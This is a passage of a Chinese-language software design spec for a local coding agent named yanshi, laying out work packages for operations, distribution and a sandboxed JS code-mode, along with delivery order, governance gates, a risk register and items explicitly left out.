**W-F-11 的实测修正**：审计写「50 个注册工具」，实测 **131 个** guarded tool 注册点。工具面比审计估计大 2.6 倍，这条的收益相应更高 —— 但**风险也更高**：模型看不见的工具就等于不存在，检索选错会让能力静默消失。建议保留一个「列出全部工具名」的元工具作为逃生门。

**W-F-14 的授权边界**：自定义角色带工具白名单，但**白名单只能收窄不能放宽** —— 它是在 profile 之内再切一刀，不是绕过 profile。`internal/bootstrap/wiring_test.go::TestGOV5OperatorProfileIsNotWidened` 的精神在这里同样适用。

**W-F-27 是定时炸弹**：DuckDuckGo HTML 端点写死在构造函数、靠正则刮 HTML，**对方改版即碎且无内网/离线替代路径**。建议在本包内优先级提到最前。

---

## 8. 工作包 W-G：运维与分发（17 条）★第七批交付

全部为 B 档 P2，全部 `未核`。**台账**：不进。

**排最后的理由**：这 17 条里没有一条影响 agent 的正确性或能力，它们改善的是**运维体验与分发**。其中 6 条依赖 INF8（W-A-02）已在第一批完成。

---

| ID | 能力 | 源 | 落点 | 验收要点 | 依赖 |
|---|---|---|---|---|---|
| W-G-01 | git 子进程全套硬化 | B58 | `cmd/yanshi/pr.go`、`internal/vcs` 的 git 调用 | 注入 `safe.bareRepository`；禁 hooks；剥 `GIT_*`；超时杀进程树 | W-B-02 |
| W-G-02 | 内嵌 git 库（无需 git 二进制） | B59 | `internal/vcs` | 无 git 二进制时仍能算增量 diff | — |
| W-G-03 | 外部 agent 配置迁移 | B60 | 新子命令 | 导入十类配置；幂等台账去重；重复导入不产生重复项 | — |
| W-G-04 | 反馈上报（含 doctor 报告） | B79 | `internal/observe` | 独立于日志级别的环形缓冲；上报前经 Redactor；上报需用户显式同意 | W-A-02 |
| W-G-05 | 指标名与标签基数校验 | B80 | `internal/observe` | 高基数标签被拒绝或截断；违规在测试期即报错 | — |
| W-G-06 | 遥测目标双分流 | B81 | `internal/observe` | `log_only` 可带 prompt，`trace_safe` 只留长度与布尔；分流由配置决定 | W-A-02 |
| W-G-07 | 网络策略决策审计流 | B82 | `internal/tools` 网络策略 | 每次决策投出带 scope/decision/来源/原因的事件；现有 `CheckHost` 审计归入同一流 | — |
| W-G-08 | 策略热重载 | B83 | 配置加载 | 运行中换网络策略；重载失败保留旧策略而非清空（fail-safe） | — |
| W-G-09 | 供应链策略（依赖冷却期） | B84 | CI / `go.mod` 检查 | 新依赖 7 天冷却；违规在 CI 变红 | — |
| W-G-10 | argv0 多路复用 | B85 | `cmd/yanshi` | 按调用名分派子功能；主入口行为不变 | — |
| W-G-11 | 一键安装脚本 | B87 | 新增 `install.sh` | 带并发锁与陈旧回收；幂等 | — |
| W-G-12 | 自更新 | B88 | 新子命令 | 查 registry 比对版本；按安装来源给正确升级命令 | W-G-13 |
| W-G-13 | 安装来源探测 | B89 | 同上 | 识别 npm/pnpm/bun/brew/standalone 等；识别不出时如实说不知道 | — |
| W-G-14 | 协议绑定自动生成 | B90 | `cmd/api-schema` 扩展 | 导出 TS 类型与 JSON Schema；生成结果进 CI diff-gate | — |
| W-G-15 | 多传输 app-server | B91 | `internal/appserver` | stdio/unix/ws/off 四种部署形态；形态由配置选择 | — |
| W-G-16 | Docker 镜像 | B92 | 新增 Dockerfile + CI | 镜像可运行 `yanshi -h`；`CGO_ENABLED=0` 构建 | — |
| W-G-17 | 代码签名 / 公证 | B86 | 发布流水线 | **🚫 BLOCKED** | — |

### 🚫 W-G-17 是本 spec 唯一的真阻塞

**代码签名 / 公证需要外部凭据**：macOS 侧需要 Apple Developer 证书 + 公证凭据（或 Azure Key Vault 等价物），Linux 侧需要 cosign / sigstore 身份。

**没有凭据，代码写完也无法验证、无法产出可用制品。** 因此本条：
- **不计入交付**；
- 若主人提供凭据，它是一条独立的小工作（改发布流水线），不影响任何其他条目；
- **不要**为了「先把代码写好」而实现一个跑不通的签名步骤 —— 那正是本仓 MEMORY 记录的「写了但零读者」形状。

**W-G-14 的注意点**：`cmd/api-schema` 曾自称 TS 生成器而实为手抄字面量，那一半已删。本条若实施，**必须真的从 `sdk/schema/` 生成**，且 `sdk/python`、`sdk/ts` 的四路一致性测试（`internal/api/v1/parity_test.go::TestContractParityAcrossFourSources`）要相应调整为「生成物 vs 真相源」而不是「四份手抄互相对账」。

---

## 9. 工作包 W-H：code-mode（1 条）★最后评估

### W-H-01 code-mode（JS 内编排工具）`A27` ✔已核

- **落点** 新包；Go 侧用 `goja`（实测 `go.mod`/`go.sum` 中零命中，需新增依赖）
- **现状** 一个「搜 50 文件、过滤、回 3 条」的动作要走 50 轮工具往返
- **契约** 在 JS 沙箱里跑模型写的编排脚本，工具挂全局对象，**无 fs 无网络**（能力只经工具回调获得）。`store()`/`load()` 跨 cell 传值。
- **验收** 模型写的脚本能调用工具并返回聚合结果；脚本内无法直接访问 fs 与网络；**每次工具回调各自过 guard 六维**；脚本超时/内存超限被终止；终止不影响所在 turn
- **依赖** 无（但建议在 W-F-11 按需加载之后 —— 两者都在改「模型怎么看见工具」）
- **门禁** GOV1（新包的依赖方向）、GOV3
- **风险** **新范式，工作量最大，且不解锁任何其他条目。** 它的价值是压缩往返轮数，与正确性无关。放最后是因为：若前七批做完发现往返轮数已不是瓶颈（W-F-11 按需加载 + W-F-22 并行工具调用可能已经解决大半），这一条可以不做。

**为什么用 `goja` 而不是 V8**：审计的理由（不必引 V8 的 CGO 负担）与本仓的 `CGO_ENABLED=0` 构建矩阵直接吻合 —— CI 有一条 `CGO_ENABLED=0` 的构建 leg，引入 CGO 依赖会让它红。

---

## 10. 交付顺序与完整性对账

### 10.1 交付顺序

```
第1批  W-A  立即修          7 条   零依赖，全并行     ← 唯一进台账
第2批  W-D  历史与记忆     16 条   INF3 是 8 条的前置
第3批  W-B  执行安全基座   27 条   INF1 吸收 F3
第4批  W-C  模型运行时     15 条   INF2 解锁密度最高
第5批  W-E  TUI 交互       16 条   INF5；每条须 tuidbg 实测
第6批  W-F  扩展与协作     33 条   INF7 排包内最前
第7批  W-G  运维与分发     17 条   含 1 条 BLOCKED
第8批  W-H  code-mode       1 条   做完前七批后重新评估是否还需要
                          ─────
                          132 条
```

**跨包依赖（只有 4 条，其余包彼此独立）**：

| 依赖 | 原因 |
|---|---|
| W-C-02（provider header）→ W-A-02（INF8 Redactor） | header 极可能承载凭据，不过 Redactor 等于亲手造新泄漏面 |
| W-C-12（`auth.command`）→ W-B-02（INF6 secproc） | 执行任意命令的配置项必须走不受信程序入口 |
| W-F-02（INF4 Hook 总线）→ W-B-02（INF6 secproc） | hook 是外部程序 |
| W-D-02（跨会话检索）→ W-A-03（CJK） | 否则跨会话检索在中文下同样零命中 |

**因此 W-B/W-C/W-D/W-E/W-F 五包的相对顺序可以调整**，只要 W-A 在最前、上表四条依赖不被倒置。上面的顺序是按「浪费最小 + 安全边界优先」排的，不是唯一解。

### 10.2 完整性对账（132 = 7+16+27+15+16+33+17+1）

| 档 | 审计条数 | 处置 | 落包 |
|---|---|---|---|
| **F**（先修） | 11 | 驳回 2（F11 §0.1、F4 §2 W-A-07）、合并 1（F6→F7，§0.2） → **8** | W-A 6 条（F2/F5/F7/F8/F9/F10）、W-B 2 条（F1/F3） |
| **A**（建议做） | 32 | 全做 | W-A 1（A26）、W-B 7、W-C 6、W-D 4、W-E 4、W-F 9、W-H 1 |
| **B**（可选） | 92 | 全做（第 3 轮「能做的全做」），其中 1 条 BLOCKED | W-B 18、W-C 9、W-D 12、W-E 12、W-F 24、W-G 17 |
| **C**（不建议） | 33 | 不做（与定位冲突） | — |
| **P2-c**（已判无需做） | 3 | 不做 | — |

**校验**：8 + 32 + 92 = 132 ✓ ；7+16+27+15+16+33+17+1 = 132 ✓

> **审计文中「P2-a 可选（91 条）」是笔误**，实际从第二部分表中提取为 **92 条**（`awk` 提取 `建议` 列为 `B` 的行）。

### 10.3 复核状态汇总

| 状态 | 条数 | 含义 |
|---|---|---|
| ✔已核 | **41**（其中 2 条复核后驳回） | F/A 全部 41 条（含 §0 的三处修正），浮浮酱在 `1c3760a` 上确认了落点符号与现状 |
| 未核 | **92** | B 档全部。落点沿用审计的 subagent 报告，**动手前先核那一条** |

---

## 11. 治理联动

**GOV1–GOV9 是机器强制的，132 条会大面积触碰它们。** 事后发现比事前写下来贵得多。

| 门禁 | 会被哪些条触发 | 应对 |
|---|---|---|
| **GOV1** 分层与端口 allowlist | W-A-07（sandbox→pathnorm）、W-D-01、W-E-02（tools↔tui 无依赖边）、W-B-01、W-H-01 | 新增跨包依赖前先看 `internal/archtest/deps_test.go::portAllowlists`。**正确做法是把共用逻辑下沉到叶子包，不是往 allowlist 里加行**（加行是债务，须附整改工作包） |
| **GOV2** 5000 纯代码行 | W-E-01（Palette 大范围机械改动）、`internal/bootstrap`（132 条的接线全部落在组合根） | 用 `go run ./cmd/codelines` 即时检查。**拆分判据是职责不是行数** —— 不要为压计数器把组合根的装配顺序切散 |
| **GOV3** 导出符号文档 | 几乎每一条 | 新导出符号必须带 doc 注释，密度对齐所在包（guard/VCS/ADK 周围是多段注释解释「为什么」） |
| **GOV4** `Build*` 可达性 | 每条新增 `internal/bootstrap` 装配的 | **写完、测绿、没接进组合根 = 运行时死代码**。这是本仓审计定性的主导失效模式 |
| **GOV5 / GOV7** 工具名双向对账 | W-C-11、W-C-14、W-F-11、W-F-23、W-E-13 等每条新工具/新命令 | GOV5 校验「allow 的必须已注册」，**反向不管** —— 新工具还须在 `internal/bootstrap/w3wiring_test.go` 里断言（对真实装配的 App） |
| **GOV6** context 注入器调用点 | W-A-08（cwd）、W-B-02（factory 恒绑后 nil 门禁消失）、W-F-02 | 每个 `With<X>` 必须有生产调用点，否则整条消费链静默读零值 |
| **GOV8** 台账逐句对账 | **仅 W-A 8 条** | acceptance 子句 → evidence → 测试 doc 注释 `ledger:` 逐字回写 → `acceptancePins` 补行（子句数 + SHA-256 前 16 位）。**漏任一处变红** |
| **GOV9** 文档符号引用 | 本 spec **不被扫**（`docs/superpowers/specs/` 在排除列表内） | 因此引用腐烂机器不会告诉你 —— `✔已核`/`未核` 标记就是为此而设。但改动 `CLAUDE.md` 与评审清单时会被扫 |
| `slashcmd_test.go` 幻影斜杠命令 | W-A-05（`/distill`）、W-E-13（`/diff`） | `phantomSlashCommands` 当前为空 map，新名字不会被拦。**但它是 denylist 不是白名单** —— 文档写了却没注册，这道门禁抓不到 |
| `overlay_test.go` | 若新增读盘型门禁测试 | 须登记进 `overlayImmuneGateFiles`，否则当场点名 |

### 11.1 生成文档的 diff-gate

改动 `internal/config.Config`（W-C-01/02/07/12、W-F-12 等）、`internal/api` schema（W-F-03/20）、任何子命令的 `-h` 文本（W-G-03/10/12）之后**必须重跑生成器并提交结果**，否则 `.github/workflows/docs.yml` 的 `git diff --exit-code` 失败：

```sh
go run ./cmd/api-schema -markdown docs/api/schema.md
go run ./cmd/api-schema -markdown docs/api/resources.md
go run ./cmd/gendocs -config docs/user-guide/configuration.md
go run ./cmd/gendocs -help-all docs/user-guide/tui.md docs/user-guide/entrypoints.md
```

### 11.2 需要新增或修订的 ADR

| ADR | 触发条 | 内容 |
|---|---|---|
| **新增**（编号取当前最大 +1） | W-D-01（INF3） | append-only rollout 的四条承重约束（§1.2 INF3）落进 Consequences |
| **新增** | W-F-02（INF4） | Hook 总线不得翻转 guard 判决、`updated_input` 后必须重跑 guard |
| **修订 ADR-0004** | W-B-01（INF1） | 元字符 HardDeny 由「一律拒绝」降级为「解析失败时的兜底」，补一条 Consequences |
| **修订 ADR-0013** | W-C-01（INF2） | 窗口来源改为数据表后，量纲约束（窗口是 token 数、阈值是比例）不变，但来源须重新表述 |

### 11.3 CLAUDE.md 须同步改写的段落

本 spec 落地后，CLAUDE.md 里以下描述会变成「说的是已消失的行为」：

- **「`shell_run` 只在 context 绑了 factory 时走 secproc」**（W-B-02 完成后 factory 恒绑）
- **「遇 `&&`/`;`/`|` 整条 HardDeny，请改为顺序执行多条命令」**（W-B-01 完成后逐段判定）
- **「窗口按模型配置 `provider.context_window`」**（W-C-01 完成后来源是数据表 + 覆盖层）
- **「压缩是就地重写活动窗口的有损单副本」**（W-D-01 完成后是投影）

**这四处不同步改，下一轮评审会照着 CLAUDE.md 推理出错误结论** —— 本仓已有先例（`checkShell` 头上那段陈旧注释让 CLAUDE.md 抄了没跟上的那份，把结构性 HardDeny 数成 3 类而实为 5 类）。

---

## 12. 风险登记

| # | 风险 | 条目 | 缓解 |
|---|---|---|---|
| R1 | **INF1 逐段判定扩大注入面** | W-B-01 | 取最严档位而非逐段独立放行；实现前先写属性测试「逐段结果 ⊑ 整条 HardDeny」 |
| R2 | **INF4 hook 改写参数后不重跑 guard** | W-F-02 | 本 spec 中最容易漏掉且最危险的一条；先写测试再写实现 |
| R3 | **INF8 脱敏打断合法用例** | W-A-02 | 单独一个提交，可独立回滚；判据须先跑真实用例验证 |
| R4 | **INF3 迁移让旧会话不可读** | W-D-01 | 「旧会话投影退化为读全部消息，与现状逐字节一致」必须有回归测试 |
| R5 | **W-C-02 header 泄漏凭据** | W-C-02 | 强依赖 W-A-02 先完成 |
| R6 | **W-F-11 按需加载让能力静默消失** | W-F-11 | 保留「列出全部工具名」的元工具作为逃生门 |
| R7 | **Windows/Linux 特性无法本机验证** | W-B-08/09/23/24/25/26/27 | 验收证据必须来自 CI 对应 leg；不接受本机跳过 |
| R8 | **92 条未核落点腐烂** | 全部 B 档 | 每条动手前先核那一条；`未核` 标记不可在未复核时改成 `✔已核` |
| R9 | **组合根膨胀** | 132 条的接线 | GOV2 预警带（`pureLineLimit` 的 90%）；按职责拆而非按行数拆 |
| R10 | **W-G-17 凭据缺失** | W-G-17 | 标 BLOCKED，不计入交付；**不实现跑不通的签名步骤** |

---

## 13. 明确不做

| 项 | 理由 |
|---|---|
| **F11 `acp_delegate` 进默认 profile** | §0.1 —— 那是刻意的授权决策，有测试与 doc 注释钉住 |
| **C 档 33 条** | 与「编码 agent + 自驱动目标循环 + 单二进制本地部署」定位冲突：云端托管、多端平台、IM 与多模态、企业管控、账号绑定 |
| **P2-c 3 条** | 三方都弱或 yanshi 已有等价替代 |
| **W-G-17 代码签名** | 外部凭据阻塞（见 §8） |

### 13.1 不要误伤的护城河

实施过程中以下是 yanshi **独有或明显更强**的，任何一条都不在缺口清单里，**改动它们所在的包时不要顺手"统一"掉**：

autoVCS 自动编辑追踪 · GOV1–GOV9 机器强制治理 + 逐句对账台账 · guard 六维顺序 + 5 类结构性 HardDeny · 运行期工具名 fail-closed（`internal/toolreg`）· 证据关卡 `task_gate_run` · goalloop 四阶段 + T0–T4 分层技能 · DAG 工作流 + 批处理 DSL · 单二进制 · 后端发现与多窗口自愈选举 · 不可信 PR 内容标注 · 脚本哈希绑定审批 · 冻结检测 · 摘要质量门 · 里程碑保留 · `cmd/tuidbg` · FakeModel 测试体系 · 文档 diff-gate

**特别提醒三处**：
- **W-B-01（INF1）** 动的正是「guard 六维 + 结构性 HardDeny」所在的包；
- **W-D-01（INF3）** 动的正是「摘要质量门 + 里程碑保留」所在的压缩链；
- **W-F-14（角色文件化）** 动的是子代理角色收窄，那是权限档案求交的基础。

三处都在护城河内部改，**必须保留原有的强约束再加新能力，不是替换**。

---

## 14. 下一步

1. 主人审阅本 spec；
2. 通过后走 `superpowers:writing-plans` 生成 **W-A 的实施计划**（7 条，零依赖，可全并行）；
3. W-A 完成并进台账后，回到本文件按 §10.1 取下一批。

**本 spec 不是实施计划。** 每条给的是「落点 + 契约 + 验收 + 依赖 + 门禁」，实施时仍需各自展开 —— 这是第 1 轮决策（一次性全量 spec）的明示代价。
